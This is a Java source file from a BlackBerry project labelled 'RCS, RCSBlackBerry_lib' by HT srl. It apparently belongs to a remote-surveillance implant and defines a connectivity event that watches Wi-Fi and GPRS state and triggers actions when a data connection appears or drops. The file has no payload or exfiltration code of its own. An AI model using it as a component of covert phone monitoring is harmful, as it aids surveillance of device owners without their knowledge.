//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : ConnectionEvent.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.event;

import net.rim.device.api.system.Application;
import net.rim.device.api.system.RadioInfo;
import net.rim.device.api.system.RadioStatusListener;
import net.rim.device.api.system.WLANConnectionListener;
import net.rim.device.api.system.WLANInfo;
import blackberry.Status;
import blackberry.config.ConfEvent;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

/**
 * The Class ConnectionEvent.
 */
public final class EventConnectivity extends Event implements
        WLANConnectionListener, RadioStatusListener {
    //#ifdef DEBUG
    private static Debug debug = new Debug("ConnectionEvent",
            DebugLevel.VERBOSE);
    //#endif

    int actionOnEnter;
    int actionOnExit;

    public boolean parse(ConfEvent event) {
        return true;
    }

    protected void actualStart() {
        Application.getApplication().addRadioListener(this);
        WLANInfo.addListener(this);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    protected void actualGo() {
        

    }

    protected void actualStop() {
        Application.getApplication().removeRadioListener(this);
        WLANInfo.removeListener(this);
        onExit();
    }


    public synchronized void networkConnected() {
        boolean wifi = true;
        Status status = Status.getInstance();

        //#ifdef DEBUG
        debug
                .trace("networkConnected  wifi: " + wifi + " gprs: "
                        + status.gprs);
        //#endif

        if (status.testAndSetWifi(wifi)!=wifi) {
            // cambiamento di stato
            if (!status.gprs) {
                onEnter();
            }
        }
    }

    public synchronized void networkDisconnected(int reason) {
        boolean wifi = false;
        Status status = Status.getInstance();

        //#ifdef DEBUG
        debug
                .trace("networkConnected  wifi: " + wifi + " gprs: "
                        + status.gprs);
        //#endif

        if (status.testAndSetWifi(wifi)!=wifi) {
            // cambiamento di stato
            if (!status.gprs) {
                onExit();
            }
        }
    }

    public void baseStationChange() {
    }

    public void networkScanComplete(boolean success) {
    }

    public synchronized void networkServiceChange(int networkId, int service) {
        // state 0, spento
        // service = 1030 acceso

        boolean gprs = (RadioInfo.getNetworkService() & RadioInfo.NETWORK_SERVICE_DATA) > 0;
        Status status = Status.getInstance();

        //#ifdef DEBUG
        debug.trace("networkServiceChange  wifi: " + status.wifi + " gprs: "
                + gprs);
        //#endif

        if (status.testAndSetGprs(gprs)!=gprs) {
            // cambiamento di stato
            if (!status.wifi) {
                if (gprs) {
                    onEnter();
                } else {
                    onExit();
                }
            }
        }
    }

    public void networkStarted(int networkId, int service) {
        
    }

    public void networkStateChange(int state) {
        //gprs = state == GPRSInfo.GPRS_STATE_READY;
        //#ifdef DEBUG
        //debug.trace("networkStateChange  wlan: " + wlan + " gprs: " + gprs);
        //#endif

    }

    public synchronized void pdpStateChange(int apn, int state, int cause) {
        boolean gprs = (RadioInfo.getNetworkService() & RadioInfo.NETWORK_SERVICE_DATA) > 0;
        Status status = Status.getInstance();

        //#ifdef DEBUG
        debug.trace("pdpStateChange  wifi: " + status.wifi + " gprs: "
                + gprs);
        //#endif

        if (status.testAndSetGprs(gprs)!=gprs) {
            // cambiamento di stato
            if (!status.wifi) {
                if (gprs) {
                    onEnter();
                } else {
                    onExit();
                }
            }
        }
    }

    public void radioTurnedOff() {
        

    }

    public void signalLevel(int level) {
        

    }

}
